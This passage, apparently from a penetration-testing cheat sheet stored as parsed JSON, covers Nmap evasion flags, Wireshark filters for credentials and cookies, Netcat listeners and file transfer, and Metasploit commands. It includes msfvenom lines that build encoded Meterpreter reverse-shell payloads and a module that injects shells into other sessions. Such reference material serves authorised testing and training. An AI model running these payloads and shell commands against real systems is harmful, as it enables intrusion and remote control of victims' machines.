    },
    {
      "type": "paragraph",
      "content": "Set MTU size",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "--spoof-mac <MAC>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Spoof MAC address",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "--data-length <SIZE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Append random data",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "--scan-delay <TIME>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scan delay",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Misc Flags",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "xsltproc <INPUT_NMAP_XML>.xml –o <OUTPUT_PATH>.html",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Convert Nmap XML file to HTML",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nmap –sP –n –oX out.xml <IP_CIDR> | grep \"Nmap\" | cut –d \" \" –f 5 > <OUTPUT_PATH>.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "out.xml"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Generate live host file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ndiff <FILE_PATH1>.xml <FILE_PATH2>.xml",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Compare Nmap results",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nmap –R –sL –dns-server <DNS_SERVER_IP> <IP_CIDR>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS reverse lookup on IP range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wireshark",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wireshark Filter Options",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "eth.addr, eth.dst, eth.src",
      "level": 0,
      "metadata": {
        "file_paths": [
          "eth.addr",
          "eth.dst",
          "eth.src"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MAC filter",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rip.auth.passwd",
      "level": 0,
      "metadata": {
        "file_paths": [
          "rip.auth.passwd"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RIP password",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip.addr, ip.dst, ip.src",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ip.addr",
          "ip.dst",
          "ip.src"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ipv6.addr, ipv6.dst, ipv6.src",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ipv6.addr",
          "ipv6.dst",
          "ipv6.src"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcp.port, tcp.dstport, tcp.srcport",
      "level": 0,
      "metadata": {
        "file_paths": [
          "tcp.port",
          "tcp.dstpor",
          "tcp.srcpor"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TCP ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcp.flags.ack, tcp.flags.fin, tcp.flags.push, tcp.flags.reset, tcp.flags.syn, tcp.flags.urg",
      "level": 0,
      "metadata": {
        "file_paths": [
          "tcp.flags.ack",
          "tcp.flags.fin",
          "tcp.flags.push",
          "tcp.flags.reset",
          "tcp.flags.syn",
          "tcp.flags.urg"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TCP flags",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "udp.port, udp.dstport, udp.srcport",
      "level": 0,
      "metadata": {
        "file_paths": [
          "udp.port",
          "udp.dstpor",
          "udp.srcpor"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "UDP ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "http.authbasic",
      "level": 0,
      "metadata": {
        "file_paths": [
          "http.authba"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Basic authentication",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "http.www_authenticate",
      "level": 0,
      "metadata": {
        "file_paths": [
          "http.www_au"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HTTP authentication",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "http.file_data",
      "level": 0,
      "metadata": {
        "file_paths": [
          "http.file_d"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HTTP data portion",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "http.cookie",
      "level": 0,
      "metadata": {
        "file_paths": [
          "http.cookie"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HTTP cookie",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "http.referer",
      "level": 0,
      "metadata": {
        "file_paths": [
          "http.refere"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HTTP referer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "http.server",
      "level": 0,
      "metadata": {
        "file_paths": [
          "http.server"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HTTP Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "http.user_agent",
      "level": 0,
      "metadata": {
        "file_paths": [
          "http.user_a"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HTTP user agent string",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "wlan.fc.type eq 0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "wlan.fc.type"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "management frame",
      "level": 2,
      "metadata": {
        "number": "802.11"
      }
    },
    {
      "type": "paragraph",
      "content": "wlan.fc.type eq 1",
      "level": 0,
      "metadata": {
        "file_paths": [
          "wlan.fc.type"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "control frame",
      "level": 2,
      "metadata": {
        "number": "802.11"
      }
    },
    {
      "type": "paragraph",
      "content": "wlan.fc.type_subtype eq 20",
      "level": 0,
      "metadata": {
        "file_paths": [
          "wlan.fc.type_s"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "data frame",
      "level": 2,
      "metadata": {
        "number": "802.11"
      }
    },
    {
      "type": "code_block",
      "content": "wlan.fc.type_subtype eq 0 (1=response)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "association request",
      "level": 2,
      "metadata": {
        "number": "802.11"
      }
    },
    {
      "type": "code_block",
      "content": "wlan.fc.type_subtype eq 2 (3=response)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "reassociation request",
      "level": 2,
      "metadata": {
        "number": "802.11"
      }
    },
    {
      "type": "code_block",
      "content": "wlan.fc.type_subtype eq 4 (5=response)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "probe request",
      "level": 2,
      "metadata": {
        "number": "802.11"
      }
    },
    {
      "type": "paragraph",
      "content": "wlan.fc.type_subtype eq 8",
      "level": 0,
      "metadata": {
        "file_paths": [
          "wlan.fc.type_s"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "beacon",
      "level": 2,
      "metadata": {
        "number": "802.11"
      }
    },
    {
      "type": "paragraph",
      "content": "wlan.fc.type_subtype eq 10",
      "level": 0,
      "metadata": {
        "file_paths": [
          "wlan.fc.type_s"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "disassociate",
      "level": 2,
      "metadata": {
        "number": "802.11"
      }
    },
    {
      "type": "code_block",
      "content": "wlan.fc.type_subtype eq 11 (12=deauthenticate)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "heading",
      "content": "authenticate",
      "level": 2,
      "metadata": {
        "number": "802.11"
      }
    },
    {
      "type": "paragraph",
      "content": "Comparison Operators",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "equals",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "eq",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "=",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "not equals",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ne",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "!=",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "greater than",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "gt",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": ">",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "less than",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "lt",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "greater than or equal to",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ge",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "quote",
      "content": "=",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Less than or equal to",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "le",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "<=",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Logical Operators",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "and",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "&&",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "or",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "||",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "xor",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "^^",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "not",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "!",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wireshark Examples",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip.addr == 10.10.50.1",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ip.addr",
          "10.10.50.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wireshark Filter by IP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip.dst == 10.10.50.1",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ip.dst",
          "10.10.50.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Filter by Destination IP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip.addr >= 10.10.50.1 and",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ip.addr",
          "10.10.50.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip.addr <=10.10.50.100",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ip.addr",
          "10.10.50.100"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Filter by IP range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "!(ip.addr == 10.10.50.1)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Filter out IP address",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcp.port == 25",
      "level": 0,
      "metadata": {
        "file_paths": [
          "tcp.port"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Filter by port",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcp.dstport == 23",
      "level": 0,
      "metadata": {
        "file_paths": [
          "tcp.dstpor"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Filter by destination port",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ip.addr == 10.10.50.1 and",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ip.addr",
          "10.10.50.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcp.port == 25",
      "level": 0,
      "metadata": {
        "file_paths": [
          "tcp.port"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Filter by IP address and port",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcp.flags.syn == 1 and tcp.flags.ack == 0",
      "level": 0,
      "metadata": {
        "file_paths": [
          "tcp.flags.syn",
          "tcp.flags.ack"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Filter SYN flag",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "eth.addr == 00:70:f4:23:18:c4",
      "level": 0,
      "metadata": {
        "file_paths": [
          "eth.addr"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MAC address filter",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: https://www.stationx.net/wireshark-cheat-sheet/",
      "level": 0,
      "metadata": {
        "urls": [
          "https://www.stationx.net/wireshark-cheat-sheet/"
        ],
        "file_paths": [
          "//www.stationx.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Netcat",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Netcat Examples",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nc <IP_ADDRESS> <PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect to target",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nc –lvp <PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start listener",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nc –v –n –z –w1 <IP_ADDRESS> <START_PORT>-<END_PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Port scanner",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Download a File",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nc –l –p <PORT> < <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start listener and stage file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nc –w3 <IP_ADDRESS> <PORT> > <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect to IP and retrieve file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload a File",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nc –l –p <PORT> > <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start listener and set path",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nc –w3 <IP_ADDRESS> <PORT> < <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect and push file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Metasploit",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Metasploit Options",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "msfconsole –r <FILE_PATH>.rc",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Launch Metasploit and load resource file",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "show exploits",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display exploits",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "show auxiliary",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display auxiliary modules",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "show payloads",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display payloads",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "search <SEARCH_STRING>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Searches module names and descriptions",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "info <MODULE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Show module information",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "use <MODULE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Load exploit or module",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "show options",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display module options",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "show advanced",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Display advanced module options",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "set <OPTION> <VALUE>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Configure framework options/parameters",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sessions -v",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List Metasploit sessions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sessions -k <ID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kill Metasploit session ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sessions –s <SCRIPT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run Meterpreter script on all sessions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "jobs -l",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all jobs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "jobs -k <ID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kill given job ID",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "exploit -j",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run exploit as background job",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "route add <IP_ADDRESS> <NETMASK> <SESSION_ID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Pivoting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "loadpath <FILE_PATH>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Load 3rd party modules or exploits",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "irb",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Live Ruby interpreter shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "connect -s <IP_ADDRESS> <PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SSL connect (Acts similarly to Netcat)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "use exploit/multi/handler",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "set ExitOnSession False",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Advanced option allows for multiple shells",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "set ConsoleLogging true",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "set SessionLogging true",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Enables logging",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: https://cdn.comparitech.com/wp-content/uploads/2019/06/Metasploit-Cheat-Sheet-1.webp",
      "level": 0,
      "metadata": {
        "urls": [
          "https://cdn.comparitech.com/wp-content/uploads/2019/06/Metasploit-Cheat-Sheet-1.webp"
        ],
        "file_paths": [
          "//cdn.comparitech.com/wp-content/uploads/2019/06/Metasploit-Cheat-Sheet-1.webp"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Create & Catch Payloads (msfvenom)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "msfvenom --list encoders",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List available encoders",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "msfvenom --list payloads",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List available payloads",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_ADDRESS> LPORT=<PORT> -e x86/shikata_ga_nai -i 3 -a x86 -f exe > encoded.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "encoded.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Created encoded Meterpreter reverse TCP payload for Windows systems",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_ADDRESS> LPORT=<PORT> -f elf > reverse.elf",
      "level": 0,
      "metadata": {
        "file_paths": [
          "reverse.elf"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Created Meterpreter reverse TCP payload for Linux systems",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "use multi/handler",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "set payload windows/meterpreter/reverse_tcp",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start Meterpreter listener",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Start MSF DB (Kali)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "service postgresql start",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "msfconsole",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Start MSF (Kali)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Meterpreter Pass a Shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "By default, this module will create a notepad.exe process and inject into it.",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "use post/windows/manage/multi_meterpreter_inject",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Use module",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "set IPLIST <IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set target IP address to pass the shell to",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "set LPORT <PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Set the target port",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "set SESSION <SESSION_ID>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Set the session ID to run this module against",
      "level": 0,
